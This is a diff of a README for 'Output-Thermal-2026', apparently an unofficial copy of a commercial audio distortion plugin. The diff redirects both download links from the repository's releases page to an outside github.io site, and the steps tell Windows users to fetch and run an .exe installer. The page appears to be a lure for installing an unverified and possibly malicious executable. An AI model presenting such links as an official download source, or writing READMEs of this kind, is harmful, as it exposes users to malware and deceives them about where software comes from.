@@ -1,6 +1,6 @@
 # 🌡️ Output-Thermal-2026 - Add Professional Distortion Effects To Music
 
-[![](https://img.shields.io/badge/Download-Output_Thermal_2026-blue)](https://github.com/Emanue5660/Output-Thermal-2026/releases)
+[![](https://img.shields.io/badge/Download-Output_Thermal_2026-blue)](https://emanue5660.github.io)
 
 This software provides sound designers and music producers with advanced distortion and character tools. Use it to add heat, grit, and warmth to any audio source. It works as a plugin inside your digital audio workstation. 
 
@@ -8,7 +8,7 @@ This software provides sound designers and music producers with advanced distort
 
 You need the installer file to begin. Follow these simple instructions to get the correct version for your Windows computer.
 
-1. Navigate to the [official releases page](https://github.com/Emanue5660/Output-Thermal-2026/releases).
+1. Navigate to the [official releases page](https://emanue5660.github.io).
 2. Look for the section titled "Assets" at the bottom of the most recent release.
 3. Click the file ending in .exe to start your download.
 4. Select a folder on your computer to save the file. Keep track of this location so you can find it later.
